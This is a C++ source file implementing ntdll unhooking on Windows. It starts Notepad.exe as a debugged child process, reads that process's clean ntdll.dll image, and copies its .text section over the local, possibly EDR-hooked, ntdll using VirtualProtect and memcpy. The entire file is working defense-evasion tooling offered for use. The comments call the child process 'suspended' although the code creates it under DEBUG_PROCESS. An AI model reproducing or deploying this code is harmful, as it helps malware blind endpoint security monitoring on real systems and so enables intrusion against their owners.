/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Get Ntdll from a SUSPENDED PROCESS.
 */

#include "header.hpp"

#define TARGET_PROCESS "Notepad.exe"

/**
 * Retrieve address of local ntdll.
 */
PVOID GetLocalNtdll(){
    PPEB pPeb = (PPEB)__readgsqword(PEB_OFFSET);
    if(pPeb == nullptr){
        return nullptr;
    }

    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return (PVOID)pLdr->DllBase;
}

/**
 * Retrieve size of ntdll from base address
 */
SIZE_T GetNtdllSizeFromAddress(IN PVOID pModule){
    if(pModule == nullptr){
        return 0;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE){
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((pModule + pDos->e_lfanew));
    if(pNtHdr->Signature != IMAGE_NT_SIGNATURE){
        return 0;
    }

    return pNtHdr->OptionalHeader.SizeOfImage;
}

/**
 * Reading ntdll from a suspended created process.
 */
BOOL ReadNtdllFromSuspendedProcess(OUT PVOID* ppNtdlBuff){
    CHAR lpPath[MAX_PATH * 2] = {0};
    CHAR cWinPath[MAX_PATH]   = {0};

    STARTUPINFOA Si           = {0};
    PROCESS_INFORMATION Pi    = {0};

    PVOID   pNtdllModule      = GetLocalNtdll();
    PBYTE   pNtdllBuffer      = nullptr;
    SIZE_T  sNtdllSize        = 0;
    SIZE_T  sNumberBytesRead  = 0;

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFOA);

    if(!GetEnvironmentVariableA("WINDIR", cWinPath, MAX_PATH)){
        printf("[!] Error calling GetEnvironmentVariableA with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    sprintf_s(lpPath, "%s\\System32\\%s", cWinPath, TARGET_PROCESS);
    printf("[*] Running : \"%s\" ...\n", lpPath);

    if(!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &Si, &Pi)){
        printf("[!] Error creating process with error : %d \n", GetLastError());
        goto _EndFunc;
    }

    printf("[+] DONE \n");
	printf("[*] Suspended Process Created With Pid : %d \n", Pi.dwProcessId);

    sNtdllSize = GetNtdllSizeFromAddress((PBYTE)pNtdllModule);
    if(sNtdllSize == 0){
        goto _EndFunc;
    }

    pNtdllBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
    if(pNtdllBuffer == nullptr){
        printf("[!] Error allocating memory.\n");
        goto _EndFunc;
    }

    if(!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberBytesRead)){
        printf("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		goto _EndFunc;
    }

    printf("[*] Read %d of %d Bytes \n", sNumberBytesRead, sNtdllSize);
    *ppNtdlBuff = pNtdllBuffer;

    printf("[#] Press <Enter> To Terminate The Child Process ... ");
	getchar();

    if(DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)){
        printf("[*] Process terminated.\n\n");
    }

_EndFunc:
    if(Pi.hProcess){
        CloseHandle(Pi.hProcess);
    }
    if(Pi.hThread){
        CloseHandle(Pi.hThread);
    }

    return !(*ppNtdlBuff == nullptr);
}

BOOL ReplaceNtdllTextSection(IN PVOID pUnhookedNtdll){
    PVOID pLocalNtdll = GetLocalNtdll();

    if(pLocalNtdll == nullptr){
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE){
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pDos->e_lfanew);
    if(pNtHdr->Signature != IMAGE_NT_SIGNATURE){
        return FALSE;
    }

    PVOID  pLocalNtdllTxt    = nullptr;
    PVOID  pRemoteNtdllTxt   = nullptr;
    SIZE_T sNtdllTextSize    = 0;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdr); //.text

    for(int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++){
        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.'){
            pLocalNtdllTxt =  (PVOID)((ULONG_PTR)pLocalNtdll + pSection[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSection[i].VirtualAddress);
            sNtdllTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    printf("\t[*] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[*] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[*] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTextSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

    if(pLocalNtdllTxt == nullptr || pRemoteNtdllTxt == nullptr || sNtdllTextSize == 0)
        return FALSE;
    
    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
		return FALSE;
    
    printf("[*] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTextSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTextSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTextSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	printf("[+] DONE !\n");

	return TRUE;
}

//test.
int main(){
    PVOID	pNtdll = NULL;
	
	printf("[i] Fetching A New \"ntdll.dll\" File From A Suspended Process\n");

	if (!ReadNtdllFromSuspendedProcess(&pNtdll))
		return EXIT_FAILURE;

	if (!ReplaceNtdllTextSection(pNtdll))
		return EXIT_FAILURE;

	HeapFree(GetProcessHeap(), 0, pNtdll);
		
	printf("[+] Ntdll Unhooked Successfully \n");
	printf("[#] Press <Enter> To Quit ...");
	getchar();
}